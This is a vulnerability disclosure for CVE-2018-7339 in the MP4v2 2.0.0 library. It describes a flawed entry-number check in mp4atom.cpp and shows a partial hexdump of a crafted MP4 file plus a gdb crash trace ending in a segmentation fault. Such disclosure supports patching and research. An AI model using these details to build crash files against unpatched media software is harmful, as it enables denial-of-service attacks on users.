
# libmp4_bof

MP4v2_BOF
CVE Reference : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7339

The MP4Atom class in mp4atom.cpp in MP4v2 through 2.0.0 mishandles
Entry Number validation for the MP4 Table Property, which allows
remote attackers to cause a denial of service (overflow, insufficient memory allocation, and segmentation fault) or possibly have unspecified other impact via a crafted mp4 file.


MP4v2 through 2.0.0

Mp4 Table Property that checks Entry number has a vulnerability with opening a maliciously craft mp4 file. It causes Memory crash and Denial-Of-Service.



 root@ubuntu:/home/wim# hexdump -C wim.mp4 | grep 63
	
 00000020  de 36 00 00 6c 69 62 66  61 61 63 20 31 2e 32 36  |.6..libfaac 1.26|
 
 00000330  3e ff af f3 c7 0b ba b2  a5 51 2a b2 63 43 ed ba  |>........Q*.cC..|
 
 00000500  ac 08 90 50 56 14 81 5c  70 aa 05 ef 34 1a a4 63  |...PV..\p...4..c|
 
 00000510  a8 63 26 5d 78 02 04 08  08 01 6a a7 72 00 85 50  |.c&]x.....j.r..P|
 
 00000630  cb 58 02 6a 02 02 80 2e  00 00 04 c0 12 01 70 00  |.X.j..........p.|
 
 00000880  9f ce 33 e1 f6 03 b3 e6  63 fd be d7 25 3f 38 d9  |..3.....c...%?8.|
 
 00000bd0  00 00 00 99 00 00 00 28  73 74 73 63 00 00 00 00  |.......(stsc....|
 
 00000c00  73 74 63 6f 00 00 00 00  00 00 00 03 00 00 00 20  |stco........... |
 
 00000c10  00 00 04 ab 00 00 08 df  00 00 00 20 63 74 74 73  |........... ctts|
 
	

 insufficient checking on Entry Number in MP4 Table Property- m_pProperties[i] 0xC1C ~ 0xC1F in /src/mp4atom.cpp

 When overflow occurs, small size of data is allocated and while reading data, crash occurs due to a memory reference error


 gdb-peda$ r ../wim.mp4
 Starting program: /home/wim/.libs/lt-mp4info ../wim.mp4
 /home/wim/.libs/lt-mp4info version 2.0.0
 ../wim.mp4:

 Program received signal SIGSEGV, Segmentation fault.

registers

 EAX: 0x80695c0 --> 0x0
 
 EBX: 0xb7fd5000 --> 0x171e40
 
 ECX: 0x0
 
 EDX: 0x0
 
 ESI: 0x8069510 --> 0xb7fd4108 --> 0xb7f0af50 (<mp4v2::impl::MP4Atom::~MP4Atom()>: push   edi)
 
 EBP: 0x8069510 --> 0xb7fd4108 --> 0xb7f0af50 (<mp4v2::impl::MP4Atom::~MP4Atom()>: push   edi)
 
 ESP: 0xbfffe890 --> 0x80695c0 --> 0x0
 
 EIP: 0xb7f0af85 (<mp4v2::impl::MP4Atom::~MP4Atom()+53>: call   DWORD PTR [edx+0x4])
 
 EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
 

code

    0xb7f0af7e <mp4v2::impl::MP4Atom::~MP4Atom()+46>: xchg   ax,ax
    
    0xb7f0af80 <mp4v2::impl::MP4Atom::~MP4Atom()+48>: mov    edx,DWORD PTR [eax]
    
    0xb7f0af82 <mp4v2::impl::MP4Atom::~MP4Atom()+50>: mov    DWORD PTR [esp],eax
    
 => 0xb7f0af85 <mp4v2::impl::MP4Atom::~MP4Atom()+53>: call   DWORD PTR [edx+0x4]
 
    0xb7f0af88 <mp4v2::impl::MP4Atom::~MP4Atom()+56>: cmp    DWORD PTR [esi+0x44],edi
    
    0xb7f0af8b <mp4v2::impl::MP4Atom::~MP4Atom()+59>: jbe    0xb7f0afa0 <mp4v2::impl::MP4Atom::~MP4Atom()+80>
    
    0xb7f0af8d <mp4v2::impl::MP4Atom::~MP4Atom()+61>: mov    edx,DWORD PTR [esi+0x4c]
    
    0xb7f0af90 <mp4v2::impl::MP4Atom::~MP4Atom()+64>: add    edi,0x1



Guessed arguments:
 arg[0]: 0x80695c0 --> 0x0

stack

 0000| 0xbfffe890 --> 0x80695c0 --> 0x0
 
 0004| 0xbfffe894 --> 0xb7d736bc --> 0xf9
 
 0008| 0xbfffe898 --> 0xffffffff
 
 0012| 0xbfffe89c --> 0xb7fd5000 --> 0x171e40
 
 0016| 0xbfffe8a0 --> 0xb7fd5000 --> 0x171e40
 
 0020| 0xbfffe8a4 --> 0x8069510 --> 0xb7fd4108 --> 0xb7f0af50 (<mp4v2::impl::MP4Atom::~MP4Atom()>: push   edi)
 
 0024| 0xbfffe8a8 ("sttc\264W\354\267\020\225\006\b")
 
 0028| 0xbfffe8ac --> 0xb7ec57b4 (<mp4v2::impl::MP4StandardAtom::~MP4StandardAtom()+36>: mov    DWORD PTR [esp],esi)

Legend: code, data, rodata, value

 Stopped reason: SIGSEGV
 
 0xb7f0af85 in mp4v2::impl::MP4Atom::~MP4Atom (this=0x8069510, __in_chrg=<optimized out>) at src/mp4atom.cpp:66
	
 66         delete m_pProperties[i];

mp4v2-2.0.0(https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mp4v2/mp4v2-2.0.0.tar.bz2) - v2-2.0.0

i
